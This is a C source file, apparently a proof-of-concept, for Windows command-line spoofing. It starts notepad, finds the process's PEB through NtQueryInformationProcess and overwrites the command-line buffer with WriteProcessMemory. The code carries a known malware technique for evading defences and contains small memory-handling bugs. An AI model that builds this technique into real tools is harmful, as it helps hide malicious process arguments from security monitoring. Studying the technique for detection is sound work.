#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <winternl.h>
#include <time.h>



BOOL Commandlinespoofing();
BOOL ReadMemoryFromRemoteProcess(HANDLE hprocess, LPVOID lpbaseaddress, LPVOID* lpbuffer, SIZE_T szsize);
BOOL WriteMemoryToRemoteProcess(HANDLE hprocess, LPVOID lpbaseaddress, LPVOID lpbuffer, SIZE_T szsize);

int main() {

	Commandlinespoofing();

	printf("Press <enter> to exit");
	getchar();

}

BOOL Commandlinespoofing() {


	typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
		HANDLE ProcessHandle,
		PROCESSINFOCLASS ProcessInformationClass,
		PVOID ProcessInformation,
		ULONG ProcessInformationLength,
		PULONG ReturnLength
		);


	WCHAR commandline[] = L"notepad first command ";


	STARTUPINFOW SI = { 0 };
	SI.cb = sizeof(SI);
	PRTL_USER_PROCESS_PARAMETERS pprocessparams;
	PROCESS_INFORMATION PI = { 0 };

	NTSTATUS status;

	PROCESS_BASIC_INFORMATION PBI = { 0 };

	PPEB ppeb = NULL;

	


	
	if (!CreateProcessW(NULL, commandline, NULL, NULL, FALSE, 0, NULL, NULL, &SI, &PI)) {

		printf("Create process failed with error no %x\n", GetLastError());
		return FALSE;
	}

	wprintf(L"[+] Notepad started with Command line: %s and PID: %d\n", commandline,PI.dwProcessId);


	//Sleep(10000);

	fnNtQueryInformationProcess NTinformationprocess = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");


	if (NTinformationprocess == NULL) {

		printf("GetprocAddress or GetmoduleHandleW failed with error no %x\n", GetLastError());
		return FALSE;

	}

	ULONG returnlength;

	status = NTinformationprocess(PI.hProcess, ProcessBasicInformation, &PBI, sizeof(PBI), &returnlength);

	if (status != 0) {

		printf("ntinformation process failed with error no %x\n", GetLastError());

	}

	printf("[+] Getting the PEB address\n");
	if (!ReadMemoryFromRemoteProcess(PI.hProcess, PBI.PebBaseAddress,&ppeb, sizeof(PEB))) {
		printf("The process memory failed and that's it");
		return FALSE;
	}

	printf("[+] PEB base address: 0x%p\n", PBI.PebBaseAddress);
	printf("[+] Getting the Command Line\n");
	if (!ReadMemoryFromRemoteProcess(PI.hProcess, ppeb->ProcessParameters, &pprocessparams, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
		HeapFree(GetProcessHeap(), 0, pprocessparams);
		return FALSE;
	}


	WCHAR updatecommandline[] = L"updated command line";
	printf("[+] updating the command line\n");
	if (!WriteMemoryToRemoteProcess(PI.hProcess, pprocessparams->CommandLine.Buffer, updatecommandline, sizeof(updatecommandline))) {
		return FALSE;
	}

	wprintf(L"[+] command line updated sucessfully to \"%s\"\n\n",updatecommandline);
	
}



BOOL ReadMemoryFromRemoteProcess(HANDLE hprocess, LPVOID lpbaseaddress, LPVOID* lpbuffer, SIZE_T szsize)
{
	SIZE_T numberofbytesread;

	*lpbuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szsize);

	if (lpbuffer == NULL) {
		printf("Heap allocation failed with error no %x\n", GetLastError());
	}

	if (!ReadProcessMemory(hprocess, lpbaseaddress, *lpbuffer, szsize, &numberofbytesread) || szsize != numberofbytesread) {


		printf("readprocess memroy failed with error no %x\n", GetLastError());
		return FALSE;
	}


	return TRUE;
}


BOOL WriteMemoryToRemoteProcess(HANDLE hprocess, LPVOID lpbaseaddress, LPVOID lpbuffer, SIZE_T szsize) 
{


	SIZE_T lpNumberOfBytesWritten = 0;

	//Sleep(2000);


	if (!WriteProcessMemory(hprocess, lpbaseaddress, lpbuffer, szsize, &lpNumberOfBytesWritten) || szsize != lpNumberOfBytesWritten) {
		printf("write process memory failed with error no %x\n", GetLastError());

		return FALSE;
	}
	return TRUE;

}